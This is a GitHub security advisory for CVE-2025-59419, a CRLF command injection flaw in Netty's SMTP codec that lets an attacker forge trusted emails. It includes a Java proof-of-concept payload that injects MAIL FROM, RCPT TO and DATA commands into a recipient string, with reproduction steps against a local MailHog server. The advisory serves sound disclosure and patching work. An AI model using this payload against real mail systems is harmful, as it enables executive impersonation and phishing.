# [H] Netty has SMTP Command Injection Vulnerability that Allows Email Forgery

## Summary
Severity: High
Advisory: GHSA-jq43-27x9-3v86
CVE: CVE-2025-59419
CWE: CWE-78, CWE-93
Ecosystem: Maven
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N/E:P (CVSS_V4)
Published: 2025-10-15
Source: https://github.com/advisories/GHSA-jq43-27x9-3v86
Type: github-advisory

## Affected
- Maven: `io.netty:netty-codec-smtp` — affected >=4.2.0.Alpha1 <4.2.7.Final
- Maven: `io.netty:netty-codec-smtp` — affected >=0 <4.1.128.Final

## Details
### Summary
An SMTP Command Injection (CRLF Injection) vulnerability in Netty's SMTP codec allows a remote attacker who can control SMTP command parameters (e.g., an email recipient) to forge arbitrary emails from the trusted server. This bypasses standard email authentication and can be used to impersonate executives and forge high-stakes corporate communications.

### Details
The root cause is the lack of input validation for Carriage Return (\r) and Line Feed (\n) characters in user-supplied parameters.

The vulnerable code is in io.netty.handler.codec.smtp.DefaultSmtpRequest, where parameters are directly concatenated into the SMTP command string. For example, when SmtpRequests.rcpt(recipient) is called, a malicious recipient string containing CRLF sequences can inject a new, separate SMTP command.

Because the injected commands are sent from the server's trusted IP, any resulting emails will likely pass SPF and DKIM checks, making them appear legitimate to the victim's email client.

### PoC
A minimal PoC involves passing a crafted string containing CRLF sequences to any `SmtpRequest` that accepts user-controlled parameters.

**1. Malicious Payload**

The core of the exploit is the payload, where new SMTP commands are injected into a parameter.

```java
// The legitimate recipient is followed by an injected email sequence
String injected_recipient = "legit-recipient@example.com\r\n" +
                          "MAIL FROM:<ceo@trusted-domain.com>\r\n" +
                          "RCPT TO:<victim@anywhere.com>\r\n" +
                          "DATA\r\n" +
                          "From: ceo@trusted-domain.com\r\n" +
                          "To: victim@anywhere.com\r\n" +
                          "Subject: Urgent: Phishing Email\r\n" +
                          "\r\n" +
                          "This is a forged email that will pass authentication checks.\r\n" +
                          ".\r\n" +
                          "QUIT\r\n";
```

**2. Triggering the Vulnerability**

The vulnerability is triggered when this payload is used to create an SMTP request.

```java
// The Netty SMTP codec will fail to sanitize this input
SmtpRequest maliciousRequest = SmtpRequests.rcpt(injected_recipient);

// When this request is sent to an SMTP server, the injected commands
// will be executed, sending a forged email.
channel.writeAndFlush(maliciousRequest);
```

**3. Full Reproduction Steps**

A complete, runnable PoC is available as a GitHub Gist to demonstrate the full attack flow against a local SMTP server

*   **Full PoC Code:** https://gist.github.com/DepthFirstDisclosures/ddacca28cb94b48fa8ab998cef59ed8c

To run the full PoC:

1.  **Set up a local SMTP server.** The easiest way is using MailHog:
    *   On macOS: `brew install mailhog && mailhog`
    *   Using Docker: `docker run -p 1025:1025 -p 8025:8025 mailhog/mailhog`
2.  **Run the PoC code.** The code will connect to the SMTP server at `localhost:1025` and send the malicious payload.
3.  **Verify the result.** Open the MailHog web UI at `http://localhost:8025`. You will see the forged email sent to `victim@anywhere.com` from `ceo@trusted-domain.com`.

### Impact
This is a SMTP Command Injection vulnerability. It impacts any application using `netty-codec-smtp` to construct SMTP requests where an attacker can control or influence any of the SMTP string parameters (e.g., `from`, `recipient`, `helo` hostname).

The primary impacts are:
*   **Economic Manipulation & Disinformation:** Attackers can forge emails from high-value targets (e.g., corporate executives, government officials) and send them to journalists, financial institutions, or the public. A fraudulent email announcing false financial results, a fake merger, or a security breach could be used to manipulate stock prices or cause significant economic disruption.
*   **Sophisticated Phishing:** Attackers can send high-fidelity phishing emails that bypass email authentication (SPF/DKIM) and appear to come from a trusted source, making them highly likely to deceive users.

## References
- https://github.com/netty/netty/security/advisories/GHSA-jq43-27x9-3v86
- https://nvd.nist.gov/vuln/detail/CVE-2025-59419
- https://github.com/netty/netty/commit/1782e8c2060a244c4d4e6f9d9112d5517ca05120
- https://github.com/netty/netty/commit/2b3fddd3339cde1601f622b9ce5e54c39f24c3f9
- https://gist.github.com/DepthFirstDisclosures/ddacca28cb94b48fa8ab998cef59ed8c
- https://github.com/netty/netty
- https://www.depthfirst.com/post/our-ai-agent-found-a-netty-zero-day-that-bypasses-email-authentication-the-story-of-cve-2025-59419
